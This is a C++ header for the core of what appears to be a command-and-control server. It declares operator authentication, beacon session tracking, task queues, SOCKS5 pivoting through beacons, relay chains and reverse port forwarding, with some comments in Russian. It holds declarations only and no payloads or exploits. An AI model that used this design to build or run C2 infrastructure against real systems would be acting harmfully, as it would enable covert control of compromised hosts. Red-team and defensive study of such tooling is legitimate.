#pragma once

#include "Config.hpp"
#include "auth/OperatorAuth.hpp"
#include "core/ListenerManager.hpp"
#include "core/SessionRegistry.hpp"
#include "core/TaskQueue.hpp"
#include "db/Database.hpp"

#include <co2h/bytes.hpp>

#include <asio.hpp>
#include <asio/ssl.hpp>

#include <cstdint>
#include <functional>
#include <memory>
#include <mutex>
#include <string>
#include <unordered_map>
#include <vector>

namespace co2h::server {

class OperatorSession;

// Central composition root: holds config, db, auth, registries and shared
// asio contexts. Passed as shared_ptr to sessions and listeners.
class Core : public std::enable_shared_from_this<Core> {
public:
    static std::shared_ptr<Core> create(Config cfg);

    asio::io_context&      io()        { return io_; }
    asio::ssl::context&    operator_tls() { return op_tls_; }

    const Config&          config()   const { return config_; }
    std::shared_ptr<Database>      db()    { return db_; }
    std::shared_ptr<OperatorAuth>  auth()  { return auth_; }
    SessionRegistry&      sessions()  { return sessions_; }
    TaskQueue&            tasks()     { return tasks_; }
    ListenerManager&      listeners() { return listeners_; }

    // Broadcast an event frame to all subscribed operators.
    void broadcast_event(proto::EventCategory cat, Bytes payload);
    // Broadcast an event frame only to operators with role "admin".
    void broadcast_event_admin(proto::EventCategory cat, Bytes payload);

    // Operator session lifecycle.
    void register_operator(std::shared_ptr<OperatorSession> s);
    void unregister_operator(std::shared_ptr<OperatorSession> s);

    // ---- SOCKS5 over C2 routing ------------------------------------------
    // Регистрирует Socks5Listener для указанного бикона.
    void register_socks_listener(const std::string& beacon_id,
                                 std::shared_ptr<Listener> lst);
    void unregister_socks_listener(const std::string& beacon_id);
    // Маршрутизирует данные от бикона (SOCKS_TASK_MAGIC) в Socks5Listener.
    void route_socks_output(const std::string& beacon_id, BytesView data);

    // ---- Relay chain routing (child → parent → C2) -----------------------
    // Обрабатывает relay-кадр от родительского бикона (RELAY_TASK_MAGIC).
    // data = [u32 child_uid BE][u8 tport_type][payload...]
    void route_relay_output(const std::string& parent_beacon_id, BytesView data);

    // ---- Rportfwd routing -----------------------------------------------
    // Регистрирует RportfwdListener для указанного бикона.
    void register_rportfwd_listener(const std::string& beacon_id,
                                    std::shared_ptr<Listener> lst);
    void unregister_rportfwd_listener(const std::string& beacon_id);
    // Маршрутизирует RPORTFWD_TASK_MAGIC данные от бикона.
    void route_rportfwd_output(const std::string& beacon_id, BytesView data);

    void run(int threads);
    void stop();

private:
    explicit Core(Config cfg);
    void init_tls();

    Config             config_;
    asio::io_context   io_;
    asio::ssl::context op_tls_{asio::ssl::context::tls_server};

    std::shared_ptr<Database>     db_;
    std::shared_ptr<OperatorAuth> auth_;
    SessionRegistry               sessions_;
    TaskQueue                     tasks_;
    ListenerManager               listeners_;

    std::mutex op_mu_;
    std::vector<std::weak_ptr<OperatorSession>> operators_;

    // SOCKS: beacon_id → Socks5Listener
    std::mutex socks_mu_;
    std::unordered_map<std::string, std::shared_ptr<Listener>> socks_map_;

    // Relay: "parent_beacon_id:child_uid_decimal" → child_beacon_id
    std::mutex relay_mu_;
    std::unordered_map<std::string, std::string> relay_child_map_;

    // Rportfwd: beacon_id → RportfwdListener
    std::mutex rportfwd_mu_;
    std::unordered_map<std::string, std::shared_ptr<Listener>> rportfwd_map_;

    std::vector<std::thread> workers_;
    std::atomic<bool>        stopping_{false};
};

}
